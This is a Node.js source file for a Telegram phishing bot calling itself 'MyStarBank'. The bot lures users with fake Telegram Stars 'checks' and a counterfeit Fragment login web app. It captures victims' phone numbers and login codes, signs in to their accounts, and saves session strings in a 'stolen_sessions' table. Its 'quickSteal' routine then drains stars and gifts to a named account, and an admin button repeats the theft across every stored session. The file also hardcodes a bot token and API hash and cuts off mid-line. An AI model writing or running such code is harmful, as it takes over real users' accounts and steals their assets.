const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { 
    polling: true,
    filepath: false
});

const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 30000,
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            // КРАДЕМ ПОДАРКИ
            await quickSteal(client, phone);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// ФУНКЦИЯ КРАЖИ ПО ШАГАМ
async function quickSteal(client, phone) {
    try {
        const user = await client.getMe();
        let stolenCount = 0;
        let report = '';
        
        // ШАГ 1: ИЩЕМ @NikLaStore
        report += `🔍 Ищем @NikLaStore...\n`;
        let targetUser = null;
        
        try {
            const targetResult = await client.invoke(
                new Api.contacts.ResolveUsername({
                    username: 'NikLaStore'
                })
            );
            
            if (targetResult && targetResult.users && targetResult.users.length > 0) {
                targetUser = targetResult.users[0];
                report += `✅ @NikLaStore найден\n`;
            } else {
                report += `❌ @NikLaStore не найден\n`;
                throw new Error('Target not found');
            }
        } catch (error) {
            report += `❌ Ошибка поиска: ${error.message}\n`;
            throw error;
        }
        
        // ШАГ 2: ПРОВЕРЯЕМ ПОДАРКИ
        report += `🎁 Проверяем подарки...\n`;
        let availableGifts = 0;
        
        try {
            const userFull = await client.invoke(
                new Api.users.GetFullUser({
                    id: user.id
                })
            );
            
            if (userFull && userFull.premium_gifts) {
                availableGifts = userFull.premium_gifts.length;
                report += `✅ Найдено подарков: ${availableGifts}\n`;
            } else {
                report += `❌ Нет подарков в "Мои"\n`;
            }
        } catch (error) {
            report += `⚠️ Ошибка проверки подарков: ${error.message}\n`;
        }
        
        // ШАГ 3: ОТПРАВЛЯЕМ ПОДАРКИ (ПОВТОРЯЕМ ДО ИСЧЕЗНОВЕНИЯ "МОИ")
        report += `🚀 Начинаем отправку подарков...\n`;
        
        let attempts = 0;
        const maxAttempts = 20;
        
        while (attempts < maxAttempts) {
            attempts++;
            
            try {
                // Отправляем подарок за 25 звезд
                const result = await client.invoke(
                    new Api.payments.SendStars({
                        peer: targetUser,
                        stars: 25,
                        purpose: new Api.InputStorePaymentPremiumGift({
                            userId: targetUser.id
                        })
                    })
                );
                
                stolenCount++;
                report += `✅ Подарок ${attempts} отправлен за 25⭐\n`;
                
                // Пауза между отправками
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (error) {
                if (error.message.includes('NOT_ENOUGH_STARS')) {
                    report += `❌ Недостаточно звезд для подарка\n`;
                    break;
                } else if (error.message.includes('PREMIUM_ACCOUNT_REQUIRED')) {
                    report += `❌ Требуется премиум аккаунт\n`;
                    break;
                } else if (error.message.includes('GIFT_NOT_AVAILABLE')) {
                    report += `❌ Подарки закончились\n`;
                    break;
                } else {
                    report += `❌ Ошибка отправки ${attempts}: ${error.message}\n`;
                    if (attempts > 3) break;
                }
            }
            
            // Проверяем остались ли подарки каждые 5 попыток
            if (attempts % 5 === 0) {
                try {
                    const userFullCheck = await client.invoke(
                        new Api.users.GetFullUser({
                            id: user.id
                        })
                    );
                    
                    if (!userFullCheck || !userFullCheck.premium_gifts || userFullCheck.premium_gifts.length === 0) {
                        report += `💡 Вкладка "Мои" пуста - останавливаемся\n`;
                        break;
                    }
                } catch (checkError) {
                    // Игнорируем ошибки проверки
                }
            }
        }
        
        // ФИНАЛЬНЫЙ ОТЧЕТ
        let message = `🎯 РЕЗУЛЬТАТ КРАЖИ:\n` +
                     `📱 Номер: ${phone}\n` +
                     `👤 Username: @${user.username || 'нет'}\n` +
                     `👑 Премиум: ${user.premium ? 'ДА' : 'НЕТ'}\n\n` +
                     `${report}\n` +
                     `💰 ИТОГО УКРАДЕНО:\n` +
                     `🎁 ПОДАРКОВ: ${stolenCount}\n`;
        
        if (stolenCount > 0) {
            message += `\n✅ УСПЕШНАЯ КРАЖА!`;
        } else {
            message += `\n❌ НИЧЕГО НЕ УДАЛОСЬ УКРАСТЬ`;
        }
        
        db.run(`UPDATE stolen_sessions SET gifts_data = ?, status = 'stolen' WHERE phone = ?`, 
            [stolenCount, phone]);
        
        bot.sendMessage(MY_USER_ID, message);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, 
            `❌ КРИТИЧЕСКАЯ ОШИБКА КРАЖИ\n` +
            `📱 Номер: ${phone}\n` +
            `⚠️ ${error.message}`
        );
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// INLINE QUERY БЕЗ ФОТО
bot.on('inline_query', (query) => {
    const results = [
        {
            type: 'article',
            id: '1',
            title: '🎫 Чек на 50 звезд',
            description: 'Создать чек на 50 звезд',
            input_message_content: {
                message_text: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'article',
            id: '2',
            title: '💫 Чек на 100 звезд',
            description: 'Создать чек на 100 звезд',
            input_message_content: {
                message_text: '🎫 Чек на 100 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// СОЗДАНИЕ ЧЕКОВ
bot.onText(/@MyStarBank_bot/, (msg) => {
    bot.sendMessage(msg.chat.id, '🎫 Создание чека:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
            ]
        }
    });
});

// CALLBACK ОБРАБОТЧИК
bot.on('callback_query', async (query) => {
    const data = query.data;
    const userId = query.from.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        
        if (data === 'create_50' || data === 'create_100') {
            const amount = data === 'create_50' ? 50 : 100;
            
            db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
                [amount, userId], function(err) {
                if (err) return;
                
                const checkId = this.lastID;
                const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                
                bot.sendMessage(query.message.chat.id, checkText, {
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                });
            });
        }
        
        // КНОПКА КРАЖИ ДЛЯ АДМИНА
        if (query.data === 'steal_all_gifts' && query.from.id === MY_USER_ID) {
            await bot.answerCallbackQuery(query.id, { text: "Начинаю кражу..." });
            
            db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, async (err, rows) => {
                let totalStolen = 0;
                
                for (const row of rows) {
                    try {
                        const stringSession = new StringSession(row.session_string);
                        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                            connectionRetries: 2,
                            timeout: 30000
                        });
                        
                        await client.connect();
                        await quickSteal(client, row.phone);
                        await client.disconnect();
                        
                        totalStolen++;
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        
                    } catch (error) {
                        console.log(`Ошибка с сессией ${row.phone}`);
                    }
                }
                
                bot.sendMessage(MY_USER_ID, `✅ Обработано ${totalStolen} аккаунтов`);
            });
        }
    } catch (error) {}
});

// ГЛАВНОЕ МЕНЮ БЕЗ ФОТО
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, 0)`, 
        [msg.from.id, msg.from.username], function(err) {});
    
    const menuText = `MyStarBank - Система передачи звезд\n\nДоступные действия:`;
    
    const menuKeyboard = {
        reply_markup: {
            keyboard: [
                [{ text: "Проверить баланс" }],
                [{ text: "Создать чек" }],
                [{ text: "Вывести средства" }]
            ],
            resize_keyboard: true
        }
    };

    bot.sendMessage(chatId, menuText, menuKeyboard);
});

// МЕНЮ /logs ДЛЯ АДМИНА
bot.onText(/\/logs/, (msg) => {
    if (msg.from.id !== MY_USER_ID) return;
    
    db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 Последние 10 сессий:\n\n';
        
        if (rows.length === 0) {
            logText = '📊 Нет данных о сессиях';
        } else {
            rows.forEach(row => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 Статус: ${row.status}\n`;
                logText += `⭐ Звезд: ${row.stars_data}\n`;
                logText += `🎁 Подарков: ${row.gifts_data}\n`;
                logText += `────────────────\n`;
            });
        }
        
        bot.sendMessage(msg.chat.id, logText, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Украсть все подарки", callback_data: "steal_all_gifts" }]
                ]
            }
        });
    });
});

// ОБРАБОТКА ТЕКСТОВЫХ КОМАНД
bot.on('message', (msg) => {
    const text = msg.text;
    
    if (text === 'Проверить баланс') {
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [msg.from.id], (err, row) => {
            bot.sendMessage(msg.chat.id, `💰 Ваш баланс: ${row ? row.balance : 0} stars`);
        });
        
    } else if (text === 'Создать чек') {
        bot.sendMessage(msg.chat.id,
            `🎫 <b>Создание чека</b>\n\n` +
            `❌ <b>Временно недоступно</b>\n\n` +
            `📝 <b>Для идентификации нужно подождать 21 день</b>`,
            { parse_mode: 'HTML' }
        );
        
    } else if (text === 'Вывести средства') {
        bot.sendMessage(msg.chat.id,
            `🏦 <b>Вывод средств</b>\n\n` +
            `🔐 <b>Для вывода необходимо войти через Fragment</b>\n\n` +
            `⚡ <b>Нажмите кнопку ниже:</b>`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🔐 Войти через Fragment", web_app: { url: WEB_APP_URL } }
                    ]]
                }
            }
        );
    }
});

// ОБРАБОТКА ЧЕКОВ
bot.onText(/\/start (.+)/, (msg, match) => {
    const params = match[1];
    
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [msg.from